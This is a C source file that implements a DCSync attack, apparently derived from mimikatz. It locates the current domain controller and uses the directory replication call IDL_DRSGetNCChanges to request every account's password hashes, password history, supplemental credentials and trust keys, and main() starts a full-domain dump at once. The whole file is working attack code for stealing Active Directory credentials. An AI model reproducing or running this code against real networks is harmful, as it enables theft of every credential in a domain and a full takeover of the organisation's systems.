#pragma once

#include "globals.h"
#include "rpc.h"
#include "drsr.h"

LPCSTR dcsync_oids[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
	szOID_ANSI_currentValue,
	szOID_isDeleted,
};
LPCSTR dcsync_oids_export[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
	szOID_ANSI_userAccountControl,
	szOID_ANSI_unicodePwd,
	szOID_isDeleted,
};

BOOL getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR* fullDCName)
{
	BOOL status = FALSE;
	DWORD ret, size;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	ret = DsGetDcName(NULL, fullDomainName, NULL, NULL, altFlags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
	if (ret == ERROR_SUCCESS)
	{
		size = (DWORD)(wcslen(cInfo->DomainControllerName + 2) + 1) * sizeof(wchar_t);
		if (*fullDCName = (wchar_t*)LocalAlloc(LPTR, size))
		{
			status = TRUE;
			RtlCopyMemory(*fullDCName, cInfo->DomainControllerName + 2, size);
		}
		NetApiBufferFree(cInfo);
	}
	else PRINT_ERROR(L"DsGetDcName: %u\n", ret);
	return status;
}

BOOL getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO* pDomainInfo)
{
	BOOL status = FALSE;
	LSA_HANDLE hLSA;
	LSA_OBJECT_ATTRIBUTES oaLsa = { 0 };

	if (NT_SUCCESS(LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
	{
		status = NT_SUCCESS(LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID*)pDomainInfo));
		LsaClose(hLSA);
	}

	return status;
}

int dcsync(BOOL allData, LPCWSTR szUser, LPCWSTR szGuid)
{
	LPCWSTR szDomain = NULL, szDc = NULL, szService = NULL;
	DSNAME dsName = { 0 };
	LPDWORD pMajor, pMinor, pBuild;
	PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;
	RPC_BINDING_HANDLE hBinding;
	DRS_MSG_GETCHGREQ getChReq = { 0 };
	DRS_MSG_GETCHGREPLY getChRep;
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	DRS_HANDLE hDrs = NULL;
	DWORD i, dwOutVersion = 0;
	ULONG drsStatus;

	getCurrentDomainInfo(&pDomainInfo);
	szDomain = pDomainInfo->DnsDomainName.Buffer;
	PRINT_INFO(L"Domain would be %s\n", szDomain);

	getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szDc);
	PRINT_INFO(L"DC would be %s\n", szDc);

	szService = L"ldap";
	RtlGetNtVersionNumbers(&pMajor, &pMinor, &pBuild);
	createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (pMajor < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, RpcSecurityCallback);
	getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt);

	if (DrsExtensionsInt.dwReplEpoch)
		PRINT_INFO(L"DS Replication Epoch is %u\n", DrsExtensionsInt.dwReplEpoch);

	getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt);
	getChReq.V8.pNC = &dsName;
	getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
	getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
	getChReq.V8.cMaxBytes = 0x00a00000; // 10M
	getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);
	getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT*)MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(dcsync_oids_export) : ARRAYSIZE(dcsync_oids)) - 1));
	getChReq.V8.pPartialAttrSet->dwVersion = 1;
	getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
	if (allData)
	{
		getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids_export);
		for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
			MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
	}
	else
	{
		getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids);
		for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
			MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
	}

	RpcTryExcept
	{
		do
		{
			RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
			drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
			if (drsStatus == 0)
			{
				if (dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
				{
					PRINT_SUCCESS(L"Success in replication!");
				}
				else
					PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
				free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
			}
			else
				PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);			
		}
		while (getChRep.V6.fMoreData);
		IDL_DRSUnbind(&hDrs);
	}
	RpcExcept(RPC_EXCEPTION)
		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept

	free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
	MIDL_user_free(getChReq.V8.pPartialAttrSet);
	deleteBinding(&hBinding);
	LsaFreeMemory(pDomainInfo);

	return 1;
}

int main(int argc, wchar_t* argv[])
{
    
	dcsync(TRUE, NULL, NULL);

}

